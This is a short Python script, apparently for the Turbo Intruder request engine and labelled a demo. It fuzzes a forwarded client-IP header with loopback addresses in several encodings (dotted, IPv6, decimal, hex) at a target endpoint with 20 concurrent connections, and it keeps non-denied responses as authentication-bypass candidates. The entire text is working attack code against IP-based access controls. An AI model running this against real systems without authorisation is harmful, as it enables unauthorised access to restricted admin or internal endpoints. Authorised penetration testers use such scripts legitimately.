# Demo: fuzz client-IP style headers to probe auth bypass logic.
CONCURRENT_CONNECTIONS = 20
REQUESTS_PER_CONNECTION = 80
HEADER_CANDIDATES = ["127.0.0.1", "localhost", "::1", "2130706433", "0x7f000001"]
KEEP_SUCCESS_CODES = [200, 201, 202, 204, 301, 302, 307]
BASELINE_DENY_CODES = [401, 403, 404]


def queue_requests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrent_connections=CONCURRENT_CONNECTIONS,
        requests_per_connection=REQUESTS_PER_CONNECTION,
        pipeline=False,
        engine=Engine.HTTP,
    )

    for value in HEADER_CANDIDATES:
        engine.queue(target.req, value, label="xff")


# Keep successful bypass candidates and uncommon status codes.
def handle_response(req, interesting):
    if req.status in KEEP_SUCCESS_CODES:
        table.add(req)
        return

    if req.status not in BASELINE_DENY_CODES:
        table.add(req)
